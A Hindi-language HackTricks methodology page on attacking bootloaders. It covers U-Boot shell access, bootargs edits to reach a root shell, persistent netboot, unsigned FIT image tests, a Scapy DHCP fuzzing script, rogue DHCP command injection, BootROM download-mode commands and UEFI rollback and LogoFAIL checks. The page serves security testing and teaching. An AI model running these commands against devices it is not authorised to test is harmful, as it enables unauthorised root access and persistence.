# बूटलोडर परीक्षण

{{#include ../../banners/hacktricks-training.md}}

निम्नलिखित कदम डिवाइस स्टार्टअप कॉन्फ़िगरेशन बदलने और U-Boot तथा UEFI-क्लास लोडरों के bootloader परीक्षण के लिए सुझाए जाते हैं। प्राथमिक ध्यान प्रारंभिक कोड निष्पादन पाने, signature/rollback सुरक्षा का आकलन करने, और recovery या network-boot पाथ्स का दुरुपयोग करने पर रखें।

संबंधित: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. इंटरप्रेटर शेल तक पहुँचें
- बूट के दौरान, `bootcmd` चलने से पहले किसी ज्ञात ब्रेक की (अक्सर कोई भी की, 0, space, या बोर्ड-विशिष्ट "magic" अनुक्रम) दबाकर U-Boot prompt पर जाएँ।

2. बूट स्थिति और वेरिएबल्स का निरीक्षण करें
- उपयोगी कमांड्स:
- `printenv` (environment dump)
- `bdinfo` (बोर्ड जानकारी, मेमरी पते)
- `help bootm; help booti; help bootz` (समर्थित kernel boot तरीके)
- `help ext4load; help fatload; help tftpboot` (उपलब्ध loaders)

3. रूट शेल प्राप्त करने के लिए boot arguments संशोधित करें
- `init=/bin/sh` जोड़ें ताकि kernel सामान्य init के बजाय shell पर जाए:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. अपने TFTP सर्वर से Netboot करें
- नेटवर्क कॉन्फ़िगर करें और LAN से kernel/fit इमेज फ़ेच करें:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. environment के माध्यम से परिवर्तनों को स्थायी करें
- यदि env स्टोरेज write-protected नहीं है, तो आप नियंत्रण पर्सिस्ट कर सकते हैं:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` जैसे वेरिएबल्स की जाँच करें जो fallback पाथ्स को प्रभावित करते हैं। गलत कॉन्फ़िगर किये हुए मान बार-बार शेल में ब्रेक करने की अनुमति दे सकते हैं।

6. debug/unsafe फीचर्स की जाँच करें
- देखें: `bootdelay` > 0, `autoboot` disabled, unrestricted `usb start; fatload usb 0:1 ...`, serial के माध्यम से `loady`/`loads` की क्षमता, अनट्रस्टेड मीडिया से `env import`, और ऐसे kernels/ramdisks जो बिना signature checks के लोड होते हैं।

7. U-Boot image/verification परीक्षण
- यदि प्लेटफ़ॉर्म FIT images के साथ secure/verified boot का दावा करता है, तो unsigned और tampered images दोनों आज़माएँ:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` की अनुपस्थिति या legacy `verify=n` व्यवहार अक्सर arbitrary payloads को बूट करने की अनुमति देता है।

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP पैरामीटर fuzzing
- U-Boot के legacy BOOTP/DHCP हैंडलिंग में memory-safety मुद्दे रहे हैं। उदाहरण के लिए, CVE‑2024‑42040 में crafted DHCP responses के द्वारा memory disclosure का वर्णन है जो U-Boot मेमोरी से बाइट्स वायर पर लीक कर सकते हैं। netboot के दौरान overly long/edge-case मानों (option 67 bootfile-name, vendor options, file/servername fields) के साथ DHCP/PXE कोड पाथ्स का परीक्षण करें और हैंग/लीक के लिए निरीक्षण करें।
- netboot के दौरान boot पैरामीटर को stress करने के लिए Minimal Scapy स्निपेट:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- यह भी सत्यापित करें कि क्या PXE filename फ़ील्ड्स shell/loader लॉजिक तक बिना sanitization के पास की जाती हैं जब उन्हें OS-side provisioning scripts से चेन किया जाता है।

9. Rogue DHCP सर्वर command injection परीक्षण
- एक rogue DHCP/PXE सर्विस सेट अप करें और filename या options फ़ील्ड्स में ऐसे अक्षर inject करने की कोशिश करें जो boot chain के बाद के चरणों में command interpreters तक पहुँच सकें। Metasploit’s DHCP auxiliary, `dnsmasq`, या custom Scapy स्क्रिप्ट अच्छे काम करते हैं। पहले लैब नेटवर्क को अलग अवश्य करें।

## SoC ROM recovery modes that override normal boot

कई SoC BootROM "loader" मोड एक्सपोज़ करते हैं जो flash images invalid होने पर भी USB/UART के माध्यम से कोड स्वीकार कर लेंगे। यदि secure-boot fuses/OTP नहीं जले हैं, तो यह chain में बहुत शुरुआती arbitrary code execution प्रदान कर सकता है।

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

जांचें कि क्या डिवाइस में secure-boot eFuses/OTP जले हुए हैं। यदि नहीं, तो BootROM download modes अक्सर किसी भी higher-level verification (U-Boot, kernel, rootfs) को बायपास कर देते हैं और आपका first-stage payload सीधे SRAM/DRAM से निष्पादित कर लेते हैं।

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- EFI System Partition (ESP) माउंट करें और loader components की जाँच करें: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths।
- यदि Secure Boot revocations (dbx) current नहीं हैं, तो downgraded या ज्ञात-भुल्ये हुए signed boot components के साथ बूट करने की कोशिश करें। यदि प्लेटफ़ॉर्म अभी भी पुराने shims/bootmanagers पर भरोसा करता है, तो आप अक्सर ESP से अपना kernel या `grub.cfg` लोड करके persistence प्राप्त कर सकते हैं।

11. Boot logo parsing bugs (LogoFAIL class)
- कई OEM/IBV firmwares DXE में boot logos को process करने वाले image-parsing flaws के प्रति संवेदनशील थे। यदि एक attacker ESP पर vendor-specific path (उदा., `\EFI\<vendor>\logo\*.bmp`) पर crafted image रख सकता है और reboot कर सकता है, तो Secure Boot सक्षम होने पर भी early boot के दौरान code execution संभव हो सकता है। यह परीक्षण करें कि क्या प्लेटफ़ॉर्म user-supplied logos स्वीकार करता है और क्या वे paths OS से writable हैं।

## Hardware caution

प्रारंभिक बूट के दौरान SPI/NAND flash के साथ इंटरैक्ट करते समय सतर्क रहें (उदा., पढ़ने को बायपास करने के लिए पिन्स को ग्राउंड करना) और हमेशा flash datasheet देखें। गलत-समय पर किये गए शॉर्ट्स डिवाइस या programmer को क्षतिग्रस्त कर सकते हैं।

## Notes and additional tips

- `env export -t ${loadaddr}` और `env import -t ${loadaddr}` आज़माएँ ताकि environment blobs को RAM और storage के बीच ले जाया जा सके; कुछ प्लेटफ़ॉर्म removable media से बिना authentication के env import करने की अनुमति देते हैं।
- extlinux.conf के माध्यम से बूट होने वाले Linux-based सिस्टम्स पर persistence के लिए boot partition में `APPEND` लाइन (जैसे `init=/bin/sh` या `rd.break` इंजेक्ट करना) अक्सर काफी होता है जब signature checks लागू नहीं होते।
- यदि userland `fw_printenv/fw_setenv` प्रदान करता है, तो सत्यापित करें कि `/etc/fw_env.config` वास्तविक env स्टोरेज से मेल खाता है। गलत कॉन्फ़िगर किये गए offsets आपको गलत MTD region पढ़ने/लिखने की अनुमति दे सकते हैं।

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
